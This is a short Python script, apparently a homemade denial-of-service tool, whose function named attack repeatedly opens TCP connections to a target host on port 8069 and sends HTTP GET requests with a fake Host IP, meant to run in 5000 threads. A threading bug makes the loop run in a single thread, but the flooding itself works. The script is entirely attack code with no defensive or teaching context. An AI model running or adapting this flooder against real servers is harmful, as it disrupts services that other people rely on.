import socket 
import threading

target = '127.0.0.1'
dummyIP = '182.21.20.33'
PORT = 8069

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, PORT))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, PORT))
        s.sendto(("Host: " + dummyIP + "\r\n\r\n").encode('ascii'), (target, PORT))
        s.close()

for i in range(5000):
     thread = threading.Thread(target=attack())
     thread.start()

